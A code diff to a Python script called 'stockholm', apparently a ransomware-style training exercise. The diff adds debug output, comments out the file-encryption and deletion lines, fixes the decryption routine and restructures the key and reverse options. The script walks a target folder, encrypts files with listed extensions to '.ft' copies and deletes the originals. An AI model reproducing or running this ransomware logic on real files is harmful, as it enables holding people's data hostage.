@@ -58,10 +58,15 @@ def stockholm(key: bytes, s: bool):
     # files = get_files(infection_dir)
     for root, subdirs, files in os.walk(TARGET_FOLDER):
         try:
+            print(f"New step")
+            print(f"ROOT {root}")
+            print (f"SUBDIRS {subdirs}")
+            
             for file in files:
-                if extentions[file.split('.')[-1]] and file.split('.')[-1] != ".ft":
-                    write_content_file(os.path.join(root, file + ".ft"), encrypt_file(os.path.join(root, file), key))
-                    remove_file(os.path.join(root, file))
+                if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
+                    os.path.join(root,file)
+                    # write_content_file(os.path.join(root, file + ".ft"), encrypt_file(os.path.join(root, file), key))
+                    # remove_file(os.path.join(root, file))
                 if s is True:
                     print(f"Encrypted file {file}")
         except Exception:
@@ -71,8 +76,9 @@ def reverse_stockholm(key: bytes):
     for root, subdirs, files in os.walk(TARGET_FOLDER):
         try:
             for file in files:
-                if file.split('.')[-1] != ".ft":
-                    write_content_file(Path(os.path.join(root, file)).stem, decrypt_file(os.path.join(root, file), key))
+                if file.split('.')[-1] == "ft":
+                    file_path, ext = os.path.splitext(os.path.join(root, file))
+                    write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
                     remove_file(os.path.join(root, file))
         except Exception:
             continue
@@ -81,29 +87,34 @@ def reverse_stockholm(key: bytes):
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-v", "--version", action="store_true", help="Show the version of stockholm")
-    parser.add_argument("-r", "--reverse", type=str, help="reverse the encryption")
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument("-r", "--reverse", type=str, help="reverse the encryption")
+    group.add_argument("-k", "--key", type=str, nargs="?", help="use this key for encryption")
+    group.add_argument("-v", "--version", action="store_true", help="Show the version of stockholm")
     parser.add_argument("-s", "--silent", action="store_true", help="silence the output")
-    parser.add_argument("-k", "--key", type=str, nargs="?", help="use this key for encryption")
     args = parser.parse_args()
     try:
+        key = None
         if args.version:
             print(f"stockholm version {VERSION}")
             exit(1)
-        if args.key:
+        if args.key is not None:
             key = args.key
-        else:
-            key = create_key()
-            print(f"The key {key}")
-
-        if not args.silent:
-            stockholm(key, True)
-            exit(1)
-        else:
-            stockholm(key, False)
+        # else:
+        #     key = create_key()
+            # print(f"The key {key}")
+        if args.reverse is None:
+            if key is None:
+                key = create_key()
+                print(f"The key {key}")
+            if not args.silent:
+                stockholm(key, True)
+            else:
+                stockholm(key, False)
 
         if args.reverse is not None:
-            reverse_stockholm(bytes(args.reverse))
+            reverse_stockholm(bytes(args.reverse, 'utf-8'))
+        exit(1)
     except Exception as e:
         print(f"Failed for {e}")
 
